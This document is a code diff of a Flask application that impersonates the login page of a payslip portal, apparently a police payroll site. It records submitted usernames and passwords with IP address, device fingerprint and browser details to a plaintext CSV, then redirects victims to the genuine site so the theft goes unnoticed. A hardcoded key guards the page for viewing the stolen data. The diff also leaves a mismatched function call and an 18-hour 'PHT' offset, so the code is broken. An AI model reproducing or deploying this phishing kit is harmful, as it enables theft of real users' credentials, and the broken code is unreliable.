@@ -1,8 +1,8 @@
 from flask import Flask, render_template, request, redirect, jsonify, session, send_file, url_for
-import csv # getting the configuration of csv
-import os # configuration/ portable way of using operating system
-import time #getting the time
-import subprocess #allows you to spawn new processes, connect to their input/output/error pipes, and obtain their return codes.
+import csv 
+import os 
+import time 
+import subprocess 
 import platform 
 import re 
 import json 
@@ -11,43 +11,43 @@ import uuid
 from datetime import datetime, timedelta
 
 app = Flask(__name__)
-app.secret_key = os.urandom(24)  # Required for session
+app.secret_key = os.urandom(24)
 
-# Add a custom filter for hashing passwords in templates
+# add a custom filter for hashing passwords in templates
 @app.template_filter('hash')
 def hash_filter(value):
     """Hash a value for display in templates"""
     if not value:
         return "N/A"
-    # Create a SHA-256 hash with some salt
+    # create a type of hash(SHA-256)
     hashed = hashlib.sha256(f"pnppms-{value}".encode()).hexdigest()
     # Return the full hash
     return hashed
 
-# Secret access key for stats page (change this to a secure value)
+# Secret access key for stats page (tip: here is the key for dashboard URL) 
 STATS_ACCESS_KEY = "database"
 
-# Route for handling the root URL
+# route for handling the starting URL or pinakaunang URL
 @app.route('/')
 def root():
     return redirect('/Account/Login')
 
-# Route for rendering the login page
+# routing for the login page
 @app.route('/Account/Login')
 def index():
     return render_template('index.html')
 
-# Route for handling login form submission
+# routing for the login form submission
 @app.route('/login', methods=['POST'])
 def login():
-    # Get the form data
+    # grab the form data
     username = request.form.get('username')
     password = request.form.get('password')
     
     if not username or not password:
         return render_template('index.html', error="Please enter both username and password")
     
-    # Get client information
+    # grab client information
     ip_address = get_client_ip()
     device_type = get_device_type()
     device_fingerprint = generate_device_fingerprint()
@@ -55,13 +55,13 @@ def login():
     
     # Get current time
     now = datetime.now()
-    adjusted_time = now + timedelta(hours=8)  
+    adjusted_time = now + timedelta(hours=18)  
     timestamp = adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p')
     
-    # Save the data with the adjusted timestamp
+    # Save the data
     save_full_data("", "", username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info)
     
-    # Redirect to external site
+    # redirect to the original payslip portal
     return redirect("https://payslip.pnppms.org/Account/Login?ReturnUrl=%2f")
 
 """
@@ -167,7 +167,7 @@ def get_browser_info():
     """
     user_agent = request.headers.get('User-Agent', '')
     
-    # Extract browser name and version
+    
     browser_name = "Unknown"
     browser_version = "Unknown"
     
@@ -263,7 +263,7 @@ def get_browser_info():
     
     return json.dumps(browser_details)
 
-def save_full_data(firstname, lastname, username, password, timestamp, ip_address, device_fingerprint, device_type, browser_info):
+def save_full_data(username, password, timestamp):
     """ 
     Save simplified user data to CSV with only essential information
     """
@@ -282,7 +282,7 @@ def save_full_data(firstname, lastname, username, password, timestamp, ip_addres
         with open(csv_path, 'a', newline='\n') as csvfile:
             writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_MINIMAL)
 
-            # Write header if file does not exist or is empty
+            # print header if file does not exist or is empty
             if not file_exists or os.stat(csv_path).st_size == 0:
                 writer.writerow([
                     'username',
@@ -291,7 +291,7 @@ def save_full_data(firstname, lastname, username, password, timestamp, ip_addres
                 ])
                 csvfile.flush()
 
-            # Write only essential data
+            # print only essential data
             writer.writerow([
                 username,
                 password,
@@ -299,11 +299,11 @@ def save_full_data(firstname, lastname, username, password, timestamp, ip_addres
             ])
             csvfile.flush()
             
-        # Update the last modified timestamp
+        # update the last modified timestamp
         update_last_modified_timestamp()
             
     except Exception as e:
-        # Fallback path if main path fails
+        # backup path if main path fails
         fallback_path = os.path.join(os.path.expanduser('~'), 'data.csv')
         with open(fallback_path, 'a', newline='\n') as csvfile:
             writer = csv.writer(csvfile, delimiter=',', quoting=csv.QUOTE_MINIMAL)
@@ -324,7 +324,7 @@ def save_full_data(firstname, lastname, username, password, timestamp, ip_addres
             ])
             csvfile.flush()
             
-        # Update the last modified timestamp (for fallback path)
+        # update the last modified timestamp (for fallback path)
         update_last_modified_timestamp(fallback_path)
 
 def update_last_modified_timestamp(csv_path=None):
@@ -333,12 +333,12 @@ def update_last_modified_timestamp(csv_path=None):
         script_dir = os.path.dirname(os.path.abspath(__file__))
         timestamp_file = os.path.join(script_dir, 'last_modified.txt')
         
-        # Apply the same time adjustment as in the login function
+        # equip the same time adjustment as in the login function
         now = datetime.now()
-        adjusted_time = now + timedelta(hours=8)  
+        adjusted_time = now + timedelta(hours=18)  
         current_time = adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
         
-        # Write timestamp to file
+        # write timestamp to file
         with open(timestamp_file, 'w') as f:
             f.write(current_time)
     except Exception as e:
@@ -354,24 +354,24 @@ def get_last_modified_timestamp():
             with open(timestamp_file, 'r') as f:
                 return f.read().strip()
         
-        # If file doesn't exist, check the CSV file's modification time
+        # if file doesn't exist, check the CSV file's modification time
         csv_path = os.path.join(script_dir, 'data.csv')
         if os.path.exists(csv_path):
             modified_time = os.path.getmtime(csv_path)
             
             timestamp_dt = datetime.fromtimestamp(modified_time)
-            adjusted_time = timestamp_dt + timedelta(hours=8)  
+            adjusted_time = timestamp_dt + timedelta(hours=18)  
             return adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
         
         # If all else fails, return current time with correct adjustment
         now = datetime.now()
-        adjusted_time = now + timedelta(hours=8)  
+        adjusted_time = now + timedelta(hours=18)  
         return adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
     except Exception as e:
         print(f"Error getting timestamp: {str(e)}")
         # Return current time with correct adjustment
         now = datetime.now()
-        adjusted_time = now + timedelta(hours=8)  
+        adjusted_time = now + timedelta(hours=18)  
         return adjusted_time.strftime('%Y-%m-%d %I:%M:%S %p') + " PHT"
 
 # Add a route to view statistics with access key protection
